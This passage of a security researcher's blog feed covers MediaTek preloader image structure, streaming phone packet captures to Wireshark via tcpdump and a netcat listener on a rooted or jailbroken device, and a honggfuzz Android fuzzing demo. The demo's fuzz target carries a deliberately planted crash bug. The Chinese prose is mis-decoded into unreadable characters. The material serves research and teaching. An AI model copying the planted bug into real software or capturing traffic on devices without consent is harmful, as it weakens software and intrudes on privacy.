<span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_DRAM_IMAGE_NAME)</span>.bin</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_DRAM_IMAGE_NAME)</span>.bin: <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$(hide)</span> <span class="variable">$(OBJCOPY)</span> $&#123;OBJCFLAGS&#125; <span class="variable">$(OBJSECOND_FLAG)</span> <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf -O binary <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_DRAM_IMAGE_NAME)</span>.bin</span><br></pre></td></tr></table></figure><p>é‚å°è¯•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PL_IMG_SECOND_PARTION_SECTION :=.pl_dram.text .pl_dram.data .pl_dram.rodata .pl_dram.start</span><br><span class="line">OBJSECOND_FLAG := $(addprefix -j , $(PL_IMG_SECOND_PARTION_SECTION))</span><br><span class="line"></span><br><span class="line">objcopy --gap-fill=0xff <span class="variable">$OBJSECOND_FLAG</span> input.elf -O binary output.bin</span><br></pre></td></tr></table></figure><p><code>addprefix</code>è¿™ä¸ªå¯ä»¥å¿½ç•¥</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/objcopy_test.png" alt="objcopy_test"></p><p>å½“ç„¶ï¼Œhashæƒ³ä¸€æ ·è¿˜æ˜¯æƒ³å¤šäº†ï¼Œæ¯•ç«Ÿç¼–è¯‘ç¯å¢ƒéƒ½ä¸ä¸€æ ·ï¼Œç›´æ¥ä¸Šdiffï¼š</p><p>ä¸€å…±ä¸¤å¤„ï¼š<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/diff1.png" alt="diff1"></p><p>è¿™ä¸ªæ˜¯å¤šäº†ä¸€ä¸ªGFHç»“æ„ï¼ˆè¯´å¥½çš„ NO_GFH éš¾é“åªæ˜¯è¯´å¤´æ²¡æœ‰)</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/diff2.png" alt="diff2"></p><ul><li><p><code>preloader_bd6737m_35g_b_m0_LINKED.bin</code></p><ul><li> æ¯”<code>output.bin</code> å¤šäº†ä¸€ä¸ªGFHåœ¨å°¾éƒ¨</li></ul></li><li><p><code>preloader_bd6737m_35g_b_m0_NO_GFH.bin</code></p><ul><li>ä¸­é—´ä¸éƒ¨åˆ†æ•°æ®ä¸ä¸€è‡´</li><li> æ¯”<code>output.bin</code> å¤šäº†ä¸€ä¸ªGFHåœ¨å°¾éƒ¨</li></ul></li><li><p><code>preloader_bd6737m_35g_b_m0.bin</code> æ¯” <code>preloader_bd6737m_35g_b_m0_NO_GFH.bin</code> åˆå¤šäº†ä¸€ä¸ªGFHå¤´å’Œå°¾éƒ¨çš„ç­¾åæ•°æ®</p></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/diff3.png" alt="diff3"></p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥è®¤å®šï¼š</p><ul><li>preloaderæ˜¯ä¸€ä¸ªelfï¼Œé€šè¿‡copyobjå¤„ç†åï¼Œå¤´ã€å°¾æ·»åŠ GFHç›¸å…³çš„æ•°æ®ï¼Œå¾—åˆ°MTKå¹³å°çš„preloader</li><li>ç„¶åMTKå¹³å°çš„preloaderå†æ·»åŠ EMMC BOOTå¤´ï¼Œå°±å¾—åˆ°äº†ä»EMMC_BOOT_[1,2] åˆ†åŒºä¸­å¾—åˆ°çš„æ•°æ®</li></ul><h4 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h4><p>è¿™é‡Œä»¥EMMCä¸ºä¾‹ï¼š</p><p><strong>EMMC_BOOT + GFH_INFO_EMMC + WTF1 + preloader_code + WTF2</strong></p><ul><li><p>EMMC_BOOT </p><ul><li> <code>MT6737/linux/bootloader/preloader/tools/gen-preloader-img.py</code></li></ul></li><li><p>GFH_INFO_EMMC :</p><ul><li><code>linux/bootloader/preloader/platform/mt6735/gfh/default/ns/GFH_INFO_EMMC.txt</code></li></ul></li><li><p>GFH Part 2 : GFH çš„å¦ä¸€éƒ¨åˆ†ï¼Œè¿˜ä¼šä¿®æ”¹ä¸Šé¢çš„size</p><ul><li><code>linux/bootloader/preloader/tools/pbp/*</code></li></ul></li><li><p>preloader_code</p><ul><li><code>preloader.elf</code> objcopyå¤„ç†ä¹‹å</li></ul></li><li><p>WTF 2 : </p><ul><li>?</li></ul></li></ul><p>ç»§ç»­çœ‹Makefileæ¥åˆ†æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$(D_BIN)/$(PL_IMAGE_NAME).bin: $(D_BIN)/$(PL_IMAGE_NAME)_NO_GFH.bin $(GFH_INFO) $(GFH_HASH) $(PBP_TOOL)</span><br><span class="line"></span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;[ Only for Non-Secure Chip ]&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;============================================&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;INI_GFH_GEN=NO&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;[ Attach <span class="subst">$(MTK_PLATFORM)</span> GFH ]&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;============================================&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot; : GFH_INFO - <span class="subst">$(GFH_INFO)</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot; : GFH_HASH - <span class="subst">$(GFH_HASH)</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    cp -f $(GFH_INFO) <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    @chmod 777 <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    cat $&lt; &gt;&gt; <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    cat $(GFH_HASH) &gt;&gt; <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    $(PBP_TOOL) <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(PBP_TOOL)</span> pass !!!!&quot;</span></span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">$(D_BIN)/$(PL_IMAGE_NAME).bin: $(D_BIN)/$(PL_IMAGE_NAME)_LINKED.bin</span><br><span class="line"></span><br><span class="line">    cp -f $&lt; <span class="variable">$@</span></span><br></pre></td></tr></table></figure><p>é‚å¯ä»¥å¾—åˆ°ï¼š</p><ul><li>EMMC_BOOT<ul><li>  <code>MT6737/linux/bootloader/preloader/tools/gen-preloader-img.py</code> ç”Ÿæˆ</li></ul></li><li>GFH_INFO_EMMC<ul><li>  <code>**linux/bootloader/preloader/platform/mt6735/gfh/default/ns/GFH_INFO_EMMC.txt**</code> ä½†æ˜¯è¿™ä¸ªfile sizeå­—æ®µæ˜¯0xffffffffï¼Œåç»­ä¼šå¤„ç†</li></ul></li><li>WTF1 : GFH_HASH<ul><li>  GFH_HASH.txt // GFHéƒ¨åˆ†ä¼šç”±PBP_TOOLå†æ¬¡å¤„ç†</li></ul></li><li>preloader code<ul><li>  ç¼–è¯‘çš„elfç»è¿‡objcopyå¤„ç†ä¹‹åçš„ä»£ç æ•°æ®</li></ul></li><li>  WTF2 ï¼špreloader extension</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><p><a href="https://linux.codingbelief.com/zh/storage/flash_memory/emmc/emmc_modes.html">eMMC å·¥ ä½œ æ¨¡ å¼ Â· Linux Kernel Internals</a></p></li><li><p><a href="https://github.com/SoCXin/MT6737">https://github.com/SoCXin/MT6737</a></p></li><li><p><a href="https://github.com/Motorola-MT6737/android_device_motorola_mt6737-common">https://github.com/Motorola-MT6737/android_device_motorola_mt6737-common</a></p></li><li><p><a href="https://github.com/andr3jx/MTK6577.git">https://github.com/andr3jx/MTK6577.git</a></p></li><li><p><a href="https://www.cnblogs.com/wen123456/p/14034493.html">MTK6735 pre-loaderæºä»£ç åˆ†æ - luoyuna - åšå®¢å›­</a></p></li><li><p>[<a href="https://blog.csdn.net/u011784994/article/details/104898430">MT6765]Preloader_æµç¨‹åˆ†æâ€“åŸºäºandroid 10_nancyçš„ä¸“æ -CSDNåšå®¢_android pmic</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;MT6737T&lt;/li&gt;
&lt;li&gt;Android&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="MTK" scheme="https://o0xmuhe.github.io/tags/MTK/"/>
    
    <category term="preloader" scheme="https://o0xmuhe.github.io/tags/preloader/"/>
    
    <category term="boot" scheme="https://o0xmuhe.github.io/tags/boot/"/>
    
  </entry>
  
  <entry>
    <title>å°†Android/iOSä¸Šçš„æµé‡è½¬å‘åˆ°Wiresharkåˆ†æ</title>
    <link href="https://o0xmuhe.github.io/2021/12/15/%E5%B0%86Android-iOS%E4%B8%8A%E7%9A%84%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0Wireshark%E5%88%86%E6%9E%90/"/>
    <id>https://o0xmuhe.github.io/2021/12/15/%E5%B0%86Android-iOS%E4%B8%8A%E7%9A%84%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0Wireshark%E5%88%86%E6%9E%90/</id>
    <published>2021-12-15T08:50:53.000Z</published>
    <updated>2021-12-15T09:03:41.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯-amp-amp-éœ€æ±‚"><a href="#èƒŒæ™¯-amp-amp-éœ€æ±‚" class="headerlink" title="èƒŒæ™¯&amp;&amp;éœ€æ±‚"></a>èƒŒæ™¯&amp;&amp;éœ€æ±‚</h2><p>  è¿«äºè¦åˆ†æä¸€äº›SDKé‡Œçš„åè®®ï¼Œéœ€è¦æŠ“åˆ°æ‰€æœ‰çš„æµé‡æ¥åˆ†æäº¤äº’è¿‡ç¨‹ï¼Œæ‰€ä»¥æœ‰äº†è¿™ç¯‡è®°å½•ï¼Œä¸»è¦æ˜¯åŸºäº<a href="https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163955839616780265452906&biz_id=0&spm=1018.2226.3001.4187">å®æ—¶ç›‘æ§Androidè®¾å¤‡ç½‘ç»œå°åŒ…</a>åšçš„å°è¯•ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„æ€è·¯æ‰©å±•åˆ°äº†iOSä¸Šã€‚</p><span id="more"></span><p>åŸç†å›¾ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump---nc---ç«¯å£è½¬å‘---nc----wireshark</span><br><span class="line">|------æ‰‹æœº------||-------PCç«¯-------|</span><br></pre></td></tr></table></figure><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote><p>æ‰‹æœºå¿…é¡»root</p></blockquote><ul><li>adb</li><li>tcpdump</li><li>nc </li></ul><p>æ‰‹æœºç«¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -l -n -s 0 -v -w - | nc -l -p  11233</span><br></pre></td></tr></table></figure><p>PCç«¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:11233 tcp:11233 &amp;&amp; nc 127.0.0.1 11233 | wireshark -k -S -i -</span><br></pre></td></tr></table></figure><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><blockquote><p>æ‰‹æœºå¿…é¡»è¶Šç‹±</p></blockquote><ul><li>nc</li><li>tcpdump</li><li>iproxy(<a href="https://libimobiledevice.org/">libimobiledevice</a>)</li></ul><p>æ‰‹æœºç«¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -l -n -s 0 -v -w - | nc -l -p 11233</span><br></pre></td></tr></table></figure><p>PCç«¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ î‚° iproxy 11233 11233</span><br><span class="line">Creating listening port 11233 <span class="keyword">for</span> device port 11233</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~ î‚° nc 127.0.0.1 11233 | wireshark -k -S -i -</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163955839616780265452906&biz_id=0&spm=1018.2226.3001.4187">å®æ—¶ç›‘æ§Androidè®¾å¤‡ç½‘ç»œå°åŒ…</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯-amp-amp-éœ€æ±‚&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯-amp-amp-éœ€æ±‚&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&amp;amp;&amp;amp;éœ€æ±‚&quot;&gt;&lt;/a&gt;èƒŒæ™¯&amp;amp;&amp;amp;éœ€æ±‚&lt;/h2&gt;&lt;p&gt;  è¿«äºè¦åˆ†æä¸€äº›SDKé‡Œçš„åè®®ï¼Œéœ€è¦æŠ“åˆ°æ‰€æœ‰çš„æµé‡æ¥åˆ†æäº¤äº’è¿‡ç¨‹ï¼Œæ‰€ä»¥æœ‰äº†è¿™ç¯‡è®°å½•ï¼Œä¸»è¦æ˜¯åŸºäº&lt;a href=&quot;https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163955839616780265452906&amp;biz_id=0&amp;spm=1018.2226.3001.4187&quot;&gt;å®æ—¶ç›‘æ§Androidè®¾å¤‡ç½‘ç»œå°åŒ…&lt;/a&gt;åšçš„å°è¯•ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„æ€è·¯æ‰©å±•åˆ°äº†iOSä¸Šã€‚&lt;/p&gt;</summary>
    
    
    
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/tags/iOS/"/>
    
    <category term="Android" scheme="https://o0xmuhe.github.io/tags/Android/"/>
    
    <category term="æµé‡åˆ†æ" scheme="https://o0xmuhe.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="Wireshark" scheme="https://o0xmuhe.github.io/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>Android Native Fuzz Demo</title>
    <link href="https://o0xmuhe.github.io/2021/12/08/Android-Native-Fuzz-Demo/"/>
    <id>https://o0xmuhe.github.io/2021/12/08/Android-Native-Fuzz-Demo/</id>
    <published>2021-12-08T14:54:18.000Z</published>
    <updated>2022-08-24T15:11:59.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>TrapFuzzçš„æ€è·¯Fuzzing Android nativeåº“ï¼Œè¿™å°±æ˜¯ä¸ªç®€å•çš„Demoï¼Œåªé’ˆå¯¹é»‘ç›’çš„åº“ã€‚</p><span id="more"></span><h2 id="honggfuzz-on-Android"><a href="#honggfuzz-on-Android" class="headerlink" title="honggfuzz on Android"></a>honggfuzz on Android</h2><ul><li>è®¾ç½®å¥½NDKè·¯å¾„</li><li><code>brew install automake</code></li></ul><p>æ„å»ºæ‰€æœ‰çš„arch(arm64-v8a, armeabi, armeabi-v7a, x86, x86_64)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make android-all</span><br></pre></td></tr></table></figure><p>å‘1: libunwindç¼–è¯‘çš„å„ç§é—®é¢˜:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225631169.png" alt="image-20220824225631169"></p><p>macosä¸å¥½ä½¿ï¼Œæ¢linuxå»ç¼–è¯‘ï¼Œç„¶åç”¨ndk r20.</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225705237.png" alt="image-20220824225705237"></p><p>ä¼ åˆ°æ‰‹æœºä¸Šè¯•è¯•çœ‹ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225722034.png" alt="image-20220824225722034"></p><p>ç„¶åå°±æ˜¯å†™ä¸ªdemoï¼Œåœ¨æ‰‹æœºä¸Šè·‘ä¸€ä¸‹çœ‹çœ‹æƒ…å†µ</p><p><a href="https://github.com/google/honggfuzz/issues/341">hfuzz-cc is missing on android build Â· Issue #341 Â· google/honggfuzz</a></p><p><a href="https://github.com/google/honggfuzz/issues/342">No coverage information on android Â· Issue #342 Â· google/honggfuzz</a></p><p>å‚æ•° <code>fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</code></p><p>è¿™ä¸ªå‚æ•°çš„è¯ä¼šæœ‰è­¦å‘Šä¿¡æ¯ï¼Œåº”è¯¥æ˜¯clang å‚æ•°çš„é—®é¢˜ã€‚</p><p>åé¢å‚è€ƒäº†è°·æ­Œçš„æ–‡æ¡£ï¼Œæ›¿æ¢äº†å‚æ•°ï¼Œç»“æœæ²¡è­¦å‘Šäº†ï¼Œä½†æ˜¯covè¿˜æ˜¯0.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [14:51:59] </span></span><br><span class="line">$ cat Android.mk </span><br><span class="line">LOCAL_PATH:= $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzz</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/libs/arm64-v8a/libhfuzz.a</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzzcommon</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/obj/<span class="built_in">local</span>/arm64-v8a/libcommon.a</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_STATIC_LIBRARIES := hfuzz hfuzzcommon</span><br><span class="line">LOCAL_SRC_FILES := fuzz_test.c</span><br><span class="line">LOCAL_MODULE := fuzz_test</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line"></span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [14:52:01] </span></span><br><span class="line">$ cat Application.mk </span><br><span class="line">APP_BUILD_SCRIPT := ./Android.mk</span><br><span class="line">APP_STL := c++_shared <span class="comment"># Or system, or none.</span></span><br><span class="line">APP_CFLAGS := -fsanitize=address  -fno-omit-frame-pointer</span><br><span class="line">APP_LDFLAGS := -fsanitize=address </span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [14:52:03] </span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225744530.png" alt="image-20220824225744530"></p><hr><p>é€€å›åˆ°<strong>honggfuzz 2.2</strong> ç„¶åç”¨æœ€å¼€å§‹ #342 é‚£ä¸ªissueçš„ç¼–è¯‘å‚æ•°æ˜¯å¯ä»¥çš„</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225756287.png" alt="image-20220824225756287"></p><p>å®Œæ•´é¡¹ç›®:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [15:53:52] C:130</span></span><br><span class="line">$ cat Android.mk </span><br><span class="line">LOCAL_PATH:= $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzz</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/libs/arm64-v8a/libhfuzz.a</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzzcommon</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/obj/<span class="built_in">local</span>/arm64-v8a/libcommon.a</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_STATIC_LIBRARIES := hfuzz hfuzzcommon</span><br><span class="line">LOCAL_SRC_FILES := fuzz_test.c</span><br><span class="line">LOCAL_MODULE := fuzz_test</span><br><span class="line">LOCAL_CFLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span><br><span class="line">LOCAL_LD_FLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span><br><span class="line"></span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [15:53:53] </span></span><br><span class="line">$ cat Application.mk </span><br><span class="line">APP_BUILD_SCRIPT := ./Android.mk</span><br><span class="line"><span class="comment">#APP_STL := c++_shared # Or system, or none.</span></span><br><span class="line"><span class="comment">#APP_CFLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls </span></span><br><span class="line"><span class="comment">#APP_LDFLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [15:53:55] </span></span><br><span class="line">$ cat fuzz_test.c </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int test_target(char* input_file_path, char* argv_0)</span><br><span class="line">&#123;</span><br><span class="line">    char *crash = NULL;</span><br><span class="line">    FILE *fp = fopen(input_file_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    char c;</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error opening file\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 